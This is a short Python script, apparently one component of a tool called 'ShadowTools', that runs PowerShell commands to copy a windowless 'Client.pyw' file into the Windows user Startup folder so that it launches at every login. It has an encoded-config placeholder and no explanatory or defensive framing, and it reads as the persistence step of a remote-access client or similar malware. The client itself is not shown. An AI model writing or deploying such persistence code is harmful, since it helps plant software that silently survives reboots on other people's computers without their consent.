#!python3
# -*- coding: utf-8 -*-
########################################
# MoveClient.py
#	moves client.py to startup folder
#
########################################
#
SoftName="ShadowTools-MoveClient"
ENCODED_CONFIG='null=='#/ENCODEDCONF
#
########################################
#		TO DO / IDEAS: 
# 
# 
########################################
# IMPORTS
########################################
#
import os

os.system("@ECHO OFF")
os.system("cd %TEMP%")
os.system("powershell -command copy-item ./Client.pyw -destination C:\\$env:HOMEPATH\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup")
os.system("powershell -command sleep 2")
os.system("powershell -command exit")
